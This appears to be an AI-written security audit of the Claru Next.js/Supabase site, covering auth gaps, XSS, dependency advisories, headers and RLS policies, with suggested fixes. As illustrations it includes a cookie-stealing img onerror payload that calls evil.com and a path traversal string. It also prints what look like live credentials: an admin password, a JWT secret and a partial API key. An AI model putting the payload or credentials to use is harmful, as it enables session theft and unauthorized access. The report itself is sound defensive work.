# Claru Landing -- Security Audit Report

**Date:** 2026-02-20
**Auditor:** Claude Opus 4.6 (automated review)
**Branch:** `ralph/data-catalog`
**Scope:** Full codebase security review -- secrets, auth, injection, data exposure, CSRF, dependencies, file uploads, environment config

---

## Summary Table

| # | Severity | Category | Finding | File(s) |
|---|----------|----------|---------|---------|
| 1 | **CRITICAL** | Secrets | Weak JWT secret in `.env.local` | `.env.local:3` |
| 2 | **CRITICAL** | Secrets | Weak admin password in `.env.local` | `.env.local:2` |
| 3 | **CRITICAL** | Secrets | Anthropic API key in `.env.local` (unused but present) | `.env.local:4` |
| 4 | **CRITICAL** | Auth Bypass | `/api/admin/settings` GET and PUT have no authentication checks | `src/app/api/admin/settings/route.ts` |
| 5 | **HIGH** | XSS | Contact form email HTML injection (user input interpolated raw) | `src/app/api/contact/route.ts:28-37` |
| 6 | **HIGH** | Dependencies | Next.js 16.1.1 has 3 known HIGH vulnerabilities (DoS, memory) | `package.json:26` |
| 7 | **HIGH** | Auth | Admin login has no rate limiting or account lockout | `src/app/api/admin/login/route.ts` |
| 8 | **HIGH** | Auth | Magic link returned in API response (approve endpoint) | `src/app/api/admin/leads/[id]/approve/route.ts:127-131` |
| 9 | **MEDIUM** | XSS | `dangerouslySetInnerHTML` in TextScramble with generated chars | `src/app/components/effects/TextScramble.tsx:128` |
| 10 | **MEDIUM** | Auth | JWT payload has no audience/issuer claims | `src/lib/admin-auth.ts:16-20` |
| 11 | **MEDIUM** | Data Exposure | Supabase error messages forwarded to client in some routes | Multiple API routes |
| 12 | **MEDIUM** | Headers | No security headers configured (CSP, X-Frame-Options, etc.) | `next.config.ts` |
| 13 | **MEDIUM** | CSRF | No explicit CSRF protection on state-changing API routes | All API routes |
| 14 | **MEDIUM** | File Upload | No file size limit on storage bucket | `supabase/migrations/002_storage_bucket.sql:18` |
| 15 | **MEDIUM** | File Upload | Storage path constructed from user-supplied filename (path traversal risk) | `src/app/api/admin/catalog/[id]/samples/route.ts:91` |
| 16 | **LOW** | Dependencies | `minimatch` ReDoS vulnerability (transitive, dev-only) | `node_modules/minimatch` |
| 17 | **LOW** | Dependencies | `ajv` ReDoS vulnerability (transitive, dev-only) | `node_modules/ajv` |
| 18 | **LOW** | Auth | User enumeration possible via `listUsers()` in approve flow | `src/app/api/admin/leads/[id]/approve/route.ts:69` |
| 19 | **LOW** | Data Exposure | `settings` table has public SELECT RLS (exposes all settings) | `supabase/migrations/001_data_catalog_schema.sql:259-260` |
| 20 | **INFO** | Config | Source maps not explicitly disabled for production | `next.config.ts` |
| 21 | **INFO** | Config | Wildcard Supabase hostname in `remotePatterns` | `next.config.ts:11` |
| 22 | **INFO** | Auth | Portal login prevents user enumeration (good practice) | `src/app/portal/login/page.tsx:55-58` |
| 23 | **INFO** | Auth | Email templates properly escape HTML (good practice) | `src/lib/email.ts:439-445` |
| 24 | **INFO** | Auth | Admin cookie is httpOnly + secure in production (good practice) | `src/app/api/admin/login/route.ts:31-36` |
| 25 | **INFO** | Auth | Portal middleware uses `getUser()` not `getSession()` (good practice) | `src/middleware.ts:99-104` |

---

## Detailed Findings

---

### 1. CRITICAL -- Weak JWT Secret in Environment

**File:** `.env.local`, line 3
**Value:** `JWT_SECRET=claru-admin-secret-change-in-production`

The JWT secret used to sign admin authentication tokens is a human-readable placeholder string. An attacker who guesses or brute-forces this secret can forge arbitrary admin tokens and gain full admin access to all datasets, leads, and settings.

**Risk:** Full admin account takeover.

**Recommendation:**
- Generate a cryptographically random secret of at least 256 bits (32+ bytes):
  ```bash
  openssl rand -base64 32
  ```
- Store in Vercel environment variables for production, never in a file that could be shared.
- Rotate the secret immediately if this value was ever used in production.

---

### 2. CRITICAL -- Weak Admin Password

**File:** `.env.local`, line 2
**Value:** `ADMIN_PASSWORD=qweqwe123!`

This is a very weak password that would be trivially brute-forced. Combined with the absence of rate limiting (Finding #7), an attacker could gain admin access quickly.

**Risk:** Admin account compromise via credential stuffing or brute force.

**Recommendation:**
- Use a strong, randomly generated password (24+ characters, mixed case, numbers, symbols).
- Consider migrating admin auth to an identity provider (e.g., Supabase Auth, Clerk, or SSO) instead of a single shared credential.
- For production, store the password in Vercel's encrypted environment variables.

---

### 3. CRITICAL -- Unused Anthropic API Key in Environment

**File:** `.env.local`, line 4
**Value:** `ANTHROPIC_API_KEY=sk-ant-api03-vEw57W3Sv...`

An Anthropic API key is present in the environment file. There is no code in the application that references `ANTHROPIC_API_KEY`, meaning this key is unused by the application but still exposed to anyone who gains access to the `.env.local` file or the Vercel environment. Since it does not have the `NEXT_PUBLIC_` prefix, it is NOT exposed to the browser -- however, it is still a secret that should not be co-located with application configuration.

**Risk:** If the `.env.local` file is leaked (e.g., accidental commit, backup exposure), the Anthropic API key could be used to run up charges on your account.

**Recommendation:**
- Remove the `ANTHROPIC_API_KEY` from `.env.local` entirely since the application does not use it.
- If it is needed for development tools (e.g., Claude Code), store it in a separate location like `~/.bashrc`, `~/.zshrc`, or a dedicated secrets manager.
- Rotate this API key immediately since it has been present in a local file.

**Note:** The `.env.local` file IS properly gitignored (`.env*` pattern in `.gitignore`) and has never been committed to git history. This mitigates the severity somewhat, but the key should still be removed and rotated.

---

### 4. CRITICAL -- Admin Settings API Route Has No Authentication

**File:** `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/src/app/api/admin/settings/route.ts`

Both the `GET` and `PUT` handlers in this file perform NO authentication checks. They call `createSupabaseAdminClient()` (which uses the service_role key) without verifying the admin JWT token. While the middleware at `src/middleware.ts` protects `/api/admin/*` routes, this is defense-in-depth failure.

The middleware check DOES protect this route because `/api/admin/settings` matches the `/api/admin/:path*` matcher pattern. However, every other admin API route also performs an in-route auth check with `verifyAdminToken()` as a second layer of defense. This route is the sole exception, making it vulnerable if:
- The middleware is modified or bypassed in the future
- A configuration error changes the matcher patterns
- A reverse proxy or CDN strips or rewrites the path

Compare with all other admin routes that include:
```typescript
const cookieStore = await cookies();
const token = cookieStore.get("admin-token");
if (!token?.value || !(await verifyAdminToken(token.value))) {
  return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
}
```

**Risk:** If middleware is bypassed, an unauthenticated user can read all admin settings and write arbitrary key-value pairs using the service_role key.

**Recommendation:**
Add the standard admin auth check to both handlers:

```typescript
import { cookies } from "next/headers";
import { verifyAdminToken } from "@/lib/admin-auth";

export async function GET() {
  const cookieStore = await cookies();
  const token = cookieStore.get("admin-token");
  if (!token?.value || !(await verifyAdminToken(token.value))) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }
  // ... rest of handler
}

export async function PUT(request: NextRequest) {
  const cookieStore = await cookies();
  const token = cookieStore.get("admin-token");
  if (!token?.value || !(await verifyAdminToken(token.value))) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }
  // ... rest of handler
}
```

---

### 5. HIGH -- HTML Injection / XSS in Contact Form Email

**File:** `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/src/app/api/contact/route.ts`, lines 28-37

User-supplied values (`name`, `email`, `company`, `project_description`) are interpolated directly into the HTML email template using template literals without any escaping:

```typescript
<td style="padding: 8px 0;">${name}</td>
<td style="padding: 8px 0;"><a href="mailto:${email}" style="color: #a8c4a6;">${email}</a></td>
<td style="padding: 8px 0;">${company}</td>
<td style="padding: 8px 0;">${project_description}</td>
```

This is in contrast to the `src/lib/email.ts` templates which properly use an `escapeHtml()` function.

An attacker could submit a contact form with values like:
```
name: <script>alert('xss')</script>
company: <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

While most modern email clients strip scripts, some older clients and web-based email viewers may render injected HTML, and `<img>` tags with `onerror` handlers or tracking pixels would work universally.

**Risk:** HTML injection into admin notification emails. Could be used for phishing, tracking, or content spoofing.

**Recommendation:**
Import and use the `escapeHtml` helper from `src/lib/email.ts`, or create a local one:

```typescript
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Then use:
<td>${escapeHtml(name)}</td>
```

---

### 6. HIGH -- Next.js 16.1.1 Has 3 Known HIGH Severity Vulnerabilities

**File:** `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/package.json`, line 26

The installed version of Next.js (16.1.1) has 3 high-severity advisories:

1. **GHSA-9g9p-9gw9-jx7f** -- DoS via Image Optimizer `remotePatterns` configuration. This is relevant because the project configures `remotePatterns` for `**.supabase.co` in `next.config.ts`.
2. **GHSA-h25m-26qc-wcjf** -- HTTP request deserialization DoS when using React Server Components. The portal uses server components extensively.
3. **GHSA-5f7q-jpqc-wp7h** -- Unbounded memory consumption via PPR resume endpoint.

A fix is available in Next.js 16.1.6.

**Risk:** Denial of service attacks against the production site.

**Recommendation:**
```bash
npm install next@16.1.6
```
Or update `package.json` to `"next": "16.1.6"` and run `npm install`.

---

### 7. HIGH -- Admin Login Has No Rate Limiting or Account Lockout

**File:** `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/src/app/api/admin/login/route.ts`

The admin login endpoint accepts unlimited authentication attempts with no rate limiting, no account lockout, and no CAPTCHA. Combined with the weak password (Finding #2), an attacker could brute-force the admin credentials quickly.

**Risk:** Credential brute-force leading to admin account compromise.

**Recommendation** (flagged per user request -- implementation deferred):
When ready to implement, consider:
- IP-based rate limiting using Vercel's edge middleware or `@upstash/ratelimit`
- Account lockout after N failed attempts (e.g., 5 failures triggers a 15-minute cooldown)
- Add a delay (e.g., `await new Promise(r => setTimeout(r, 1000))`) to slow down automated attacks
- Consider Cloudflare Turnstile or hCaptcha for the login form

---

### 8. HIGH -- Magic Link Returned in Approve API Response

**File:** `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/src/app/api/admin/leads/[id]/approve/route.ts`, lines 127-131

When an admin approves a lead, the API response includes the raw magic link:

```typescript
return NextResponse.json({
  lead: updatedLead,
  magic_link: magicLink,
  message: "Lead approved successfully",
});
```

The magic link is a one-time authentication URL that grants full portal access to the lead's account. Returning it in an API response means:
- It appears in browser DevTools network tab
- It could be logged by any proxy, CDN, or monitoring tool
- If the admin's session is compromised, the attacker gets magic links for all leads

The magic link should instead be sent directly to the lead's email (using the approval email flow already implemented in `src/lib/email.ts`).

**Risk:** Magic link exposure leading to unauthorized portal access.

**Recommendation:**
- Remove `magic_link` from the API response
- Ensure the approval flow sends the magic link directly via email using `sendLeadApprovalEmail()`
- If the admin needs to see the link for debugging, consider logging it server-side only

---

### 9. MEDIUM -- dangerouslySetInnerHTML in TextScramble Component

**File:** `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/src/app/components/effects/TextScramble.tsx`, line 128

The TextScramble component uses `dangerouslySetInnerHTML` to render the scrambled text animation:

```tsx
<span
  className={`font-mono ${className}`}
  onMouseEnter={handleMouseEnter}
  dangerouslySetInnerHTML={{ __html: displayText }}
/>
```

The HTML injected comes from two sources:
1. The `text` prop (set back on line 89 when animation completes)
2. Generated `<span>` tags during the scramble animation (line 80)

Currently, the `text` prop values are all hardcoded strings in the codebase (e.g., "can't find." in the data catalog page). However, if a future developer passes user-controlled content to this component, it would create an XSS vulnerability.

**Risk:** Low current risk (all inputs are hardcoded), but the pattern is dangerous and could become exploitable with future changes.

**Recommendation:**
- Add a code comment warning that the `text` prop must NEVER contain user-controlled input
- Consider refactoring to use React elements instead of raw HTML (use an array of character objects rendered via `.map()`)
- At minimum, escape the `text` prop before using it in the scramble logic

---

### 10. MEDIUM -- JWT Lacks Audience and Issuer Claims

**File:** `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/src/lib/admin-auth.ts`, lines 16-20

The admin JWT tokens only contain `{ role: "admin" }` and standard claims (iat, exp). They lack `iss` (issuer) and `aud` (audience) claims, and verification does not check these either:

```typescript
const token = await new SignJWT({ role: "admin" })
  .setProtectedHeader({ alg: "HS256" })
  .setIssuedAt()
  .setExpirationTime("24h")
  .sign(JWT_SECRET_KEY());
```

Without audience/issuer claims, a JWT signed for a different purpose (if the same secret is reused elsewhere) could be accepted as a valid admin token.

**Risk:** Token confusion if the JWT secret is shared across services.

**Recommendation:**
```typescript
const token = await new SignJWT({ role: "admin" })
  .setProtectedHeader({ alg: "HS256" })
  .setIssuedAt()
  .setIssuer("claru-landing")
  .setAudience("claru-admin")
  .setExpirationTime("24h")
  .sign(JWT_SECRET_KEY());
```

And verify with:
```typescript
await jwtVerify(token, JWT_SECRET_KEY(), {
  issuer: "claru-landing",
  audience: "claru-admin",
});
```

---

### 11. MEDIUM -- Supabase Error Messages Forwarded to Client

**Files:**
- `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/src/app/api/admin/catalog/route.ts`, line 69
- `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/src/app/api/admin/catalog/[id]/route.ts`, line 100
- `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/src/app/api/admin/settings/route.ts`, lines 17 and 49

Several API routes forward raw Supabase error messages to the client:

```typescript
return NextResponse.json(
  { error: error.message ?? "Create failed" },
  { status: 500 }
);
```

and:

```typescript
return NextResponse.json({ error: error.message }, { status: 500 });
```

Supabase error messages can reveal internal details about database schema, constraint names, column types, and query structure.

**Risk:** Information disclosure that aids attackers in understanding the database schema.

**Recommendation:**
Return generic error messages to the client and log the full error server-side:

```typescript
console.error("[POST /api/admin/catalog]", error);
return NextResponse.json(
  { error: "Create failed" },
  { status: 500 }
);
```

---

### 12. MEDIUM -- No Security Headers Configured

**File:** `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/next.config.ts`

The Next.js config does not set any security headers. The following headers are missing:

- `Content-Security-Policy` -- prevents XSS and data injection
- `X-Frame-Options` / `frame-ancestors` -- prevents clickjacking
- `X-Content-Type-Options: nosniff` -- prevents MIME sniffing
- `Strict-Transport-Security` -- forces HTTPS
- `Referrer-Policy` -- controls referrer information
- `Permissions-Policy` -- restricts browser features

**Risk:** The site is vulnerable to clickjacking, MIME confusion attacks, and lacks defense-in-depth against XSS.

**Recommendation:**
Add security headers to `next.config.ts`:

```typescript
const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          {
            key: "X-Frame-Options",
            value: "DENY",
          },
          {
            key: "X-Content-Type-Options",
            value: "nosniff",
          },
          {
            key: "Referrer-Policy",
            value: "strict-origin-when-cross-origin",
          },
          {
            key: "Permissions-Policy",
            value: "camera=(), microphone=(), geolocation=()",
          },
          {
            key: "Strict-Transport-Security",
            value: "max-age=63072000; includeSubDomains; preload",
          },
        ],
      },
    ];
  },
  // ... existing config
};
```

---

### 13. MEDIUM -- No Explicit CSRF Protection on API Routes

**Files:** All routes under `src/app/api/admin/`

Next.js App Router API routes do not include built-in CSRF protection. The admin routes rely on:
1. `SameSite=Lax` cookie attribute (set on the admin-token cookie)
2. The fact that POST requests require a JSON body (which triggers a CORS preflight for cross-origin requests)

These provide *some* protection, but `SameSite=Lax` still allows top-level navigation-triggered requests (though only GET, not POST), and the JSON Content-Type check is implicit rather than explicit.

The portal routes are protected by Supabase's session management which handles CSRF internally.

**Risk:** Low-to-medium. A sophisticated CSRF attack could potentially be crafted if the `SameSite` policy is relaxed or if a browser vulnerability is exploited.

**Recommendation:**
- Verify that `Content-Type: application/json` is explicitly checked on all mutation endpoints
- Consider adding a custom CSRF token header (e.g., `X-CSRF-Token`) that must match a cookie value
- Alternatively, use Next.js Server Actions (which include built-in CSRF protection) for state-changing operations

---

### 14. MEDIUM -- No File Size Limit on Storage Bucket

**File:** `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/supabase/migrations/002_storage_bucket.sql`, line 18

The storage bucket is created with `file_size_limit` set to `null`:

```sql
INSERT INTO storage.buckets (id, name, public, file_size_limit, allowed_mime_types)
VALUES (
  'dataset-samples',
  'dataset-samples',
  false,
  null,  -- no file size limit
  ...
);
```

Without a file size limit, an authenticated admin could upload arbitrarily large files, leading to storage cost explosion or denial of service.

**Risk:** Storage exhaustion or cost overrun via oversized uploads.

**Recommendation:**
Set a reasonable file size limit based on expected dataset sample sizes. For video samples, 500MB-1GB is typical:

```sql
file_size_limit = 1073741824  -- 1 GB in bytes
```

---

### 15. MEDIUM -- Storage Path Constructed from User-Supplied Filename

**File:** `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/src/app/api/admin/catalog/[id]/samples/route.ts`, line 91

The storage path is constructed by concatenating the user-supplied `filename` directly:

```typescript
const storagePath = `${datasetId}/samples/${sampleId}/${filename}`;
```

While the `datasetId` is from the URL params and `sampleId` is a random UUID, the `filename` comes from the request body. A malicious admin could potentially supply a filename containing path traversal characters like `../../../etc/passwd` or other special characters.

Supabase Storage internally sanitizes paths, but relying on downstream sanitization is fragile.

**Risk:** Potential path traversal if Supabase's internal sanitization has a bug or changes behavior.

**Recommendation:**
Sanitize the filename before constructing the path:

```typescript
function sanitizeFilename(filename: string): string {
  // Remove path separators and null bytes
  return filename.replace(/[/\\:\0]/g, '_').replace(/\.\./g, '_');
}

const safeFilename = sanitizeFilename(filename);
const storagePath = `${datasetId}/samples/${sampleId}/${safeFilename}`;
```

---

### 16. LOW -- minimatch ReDoS Vulnerability (Dev-Only)

**Advisory:** GHSA-3ppc-4f35-3m26

The `minimatch` package has a ReDoS (Regular Expression Denial of Service) vulnerability with repeated wildcards. This is a transitive dependency of ESLint and TypeScript ESLint packages, which are dev-only dependencies and never run in production.

**Risk:** No production impact. Could slow down developer machines running ESLint with pathological glob patterns.

**Recommendation:**
Update ESLint and TypeScript ESLint packages when compatible versions are available:
```bash
npm audit fix
```

---

### 17. LOW -- ajv ReDoS Vulnerability (Dev-Only)

**Advisory:** GHSA-2g4f-4pwh-qvx6

The `ajv` package has a ReDoS vulnerability when using the `$data` option. This is a transitive dev-only dependency.

**Risk:** No production impact.

**Recommendation:**
```bash
npm audit fix
```

---

### 18. LOW -- User Enumeration via listUsers() in Approve Flow

**File:** `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/src/app/api/admin/leads/[id]/approve/route.ts`, line 69

When creating a Supabase Auth user fails (likely because the user already exists), the code calls `supabase.auth.admin.listUsers()` and iterates all users to find one matching by email:

```typescript
const { data: existingUsers } = await supabase.auth.admin.listUsers();
const existing = existingUsers?.users?.find((u) => u.email === lead.email);
```

This has two issues:
1. It fetches ALL users which is inefficient and will not scale
2. It does not use pagination, so it may miss users beyond the first page

**Risk:** Performance degradation as user count grows; potential for incomplete results.

**Recommendation:**
Use the `listUsers` filter or `getUserByEmail` admin method:
```typescript
const { data: { users } } = await supabase.auth.admin.listUsers({
  filter: `email.eq.${lead.email}`,
});
```

---

### 19. LOW -- Settings Table Has Public SELECT RLS

**File:** `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/supabase/migrations/001_data_catalog_schema.sql`, lines 259-260

```sql
CREATE POLICY "Public can read settings"
  ON settings FOR SELECT
  USING (true);
```

All settings are readable by anyone, including anonymous/unauthenticated users. Currently the only setting is `booking_url` which is intended to be public, but if sensitive settings are added in the future (API keys, feature flags, internal URLs), they would be exposed.

**Risk:** Low currently, but a footgun for future settings that should be private.

**Recommendation:**
Either:
1. Add a `is_public` boolean column and restrict the policy:
   ```sql
   USING (is_public = true)
   ```
2. Or create separate tables for public vs. private settings.

---

### 20. INFO -- Source Maps Not Explicitly Disabled

**File:** `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/next.config.ts`

Next.js does not generate client-side source maps in production by default, so this is informational. However, if someone adds `productionBrowserSourceMaps: true` or `devtool: 'source-map'`, the full source code would be exposed to anyone inspecting the browser.

**Recommendation:**
Explicitly set `productionBrowserSourceMaps: false` in next.config.ts for clarity:
```typescript
const nextConfig: NextConfig = {
  productionBrowserSourceMaps: false,
  // ...
};
```

---

### 21. INFO -- Wildcard Supabase Hostname in remotePatterns

**File:** `/Users/johnthomas/Desktop/IMPORTANT CODING PROJECTS/claru-landing/next.config.ts`, line 11

```typescript
hostname: "**.supabase.co",
```

The double wildcard `**` matches ANY subdomain of `supabase.co`, not just your specific project. This means the Next.js Image Optimizer will proxy images from ANY Supabase project. While this is unlikely to be exploited directly, it is overly permissive.

**Recommendation:**
Restrict to your specific Supabase project:
```typescript
hostname: "usmgbihcevnvrkyvrlju.supabase.co",
```

---

### 22-25. INFO -- Positive Security Findings (Good Practices)

These are security practices already implemented correctly:

- **#22: Portal login prevents user enumeration.** The magic link login always shows "check your email" regardless of whether the email exists (`src/app/portal/login/page.tsx`, lines 55-58). This is correct security behavior.

- **#23: Email templates properly escape HTML.** The `src/lib/email.ts` file includes an `escapeHtml()` function and uses it consistently for all user-supplied values in admin notification, approval, and rejection email templates.

- **#24: Admin cookie is httpOnly + secure.** The admin-token cookie is set with `httpOnly: true` (preventing JavaScript access), `secure: true` in production (preventing transmission over HTTP), and `sameSite: "lax"` (providing baseline CSRF protection).

- **#25: Portal middleware uses `getUser()` not `getSession()`.** The middleware correctly uses `supabase.auth.getUser()` which validates the session server-side with Supabase, rather than `getSession()` which only reads the JWT locally. This follows Supabase's recommended security practice.

---

## RLS Policy Review

The Supabase Row-Level Security policies are well-designed:

| Table | Policy | Assessment |
|-------|--------|------------|
| `dataset_categories` | Public read | OK -- categories are non-sensitive |
| `datasets` | Anon: published only; Authenticated: via `lead_dataset_access` join | OK -- properly scoped |
| `dataset_samples` | Authenticated: via `lead_dataset_access` join | OK -- leads only see samples from granted datasets |
| `leads` | Own record only (via `supabase_user_id = auth.uid()`) | OK -- leads cannot see other leads |
| `lead_dataset_access` | Own grants only (via leads join) | OK -- properly scoped |
| `custom_requests` | Own requests only (INSERT + SELECT) | OK -- properly scoped |
| `settings` | Public read | See Finding #19 |
| `storage.objects` | Via `lead_dataset_access` join | OK -- proper access control |

**Key strength:** The `service_role` key (which bypasses RLS) is ONLY used in `src/lib/supabase/admin.ts` and is never exposed to the client. The `NEXT_PUBLIC_SUPABASE_ANON_KEY` used in browser code correctly respects RLS policies.

---

## Dependency Audit Summary

```
npm audit: 16 vulnerabilities (1 moderate, 15 high)

Production-impacting:
  - next@16.1.1: 3 HIGH (DoS via Image Optimizer, RSC deserialization, PPR memory)
    Fix: npm install next@16.1.6

Dev-only (no production impact):
  - minimatch: 1 HIGH (ReDoS) -- transitive via eslint
  - ajv: 1 MODERATE (ReDoS) -- transitive via eslint
  - eslint ecosystem: 12 HIGH (all depend on vulnerable minimatch)
    Fix: npm audit fix --force (may require eslint major version change)
```

---

## Prioritized Remediation Plan

### Immediate (Before Next Deploy)
1. **Rotate all secrets** -- JWT secret, admin password, Anthropic API key
2. **Fix Finding #4** -- Add auth checks to `/api/admin/settings`
3. **Fix Finding #5** -- Escape HTML in contact form email template
4. **Fix Finding #6** -- Update Next.js to 16.1.6

### Short-Term (This Sprint)
5. Fix Finding #8 -- Remove magic link from API response
6. Fix Finding #12 -- Add security headers to next.config.ts
7. Fix Finding #14 -- Set file size limit on storage bucket
8. Fix Finding #15 -- Sanitize filenames in storage path construction
9. Fix Finding #11 -- Stop forwarding Supabase error messages to client

### Medium-Term (Next Sprint)
10. Fix Finding #10 -- Add issuer/audience claims to JWT
11. Fix Finding #13 -- Add explicit CSRF protection
12. Fix Finding #19 -- Scope settings RLS policy
13. Fix Finding #7 -- Implement rate limiting on admin login (flagged, user-deferred)
14. Fix Finding #9 -- Refactor TextScramble away from dangerouslySetInnerHTML

---

*End of security audit report.*
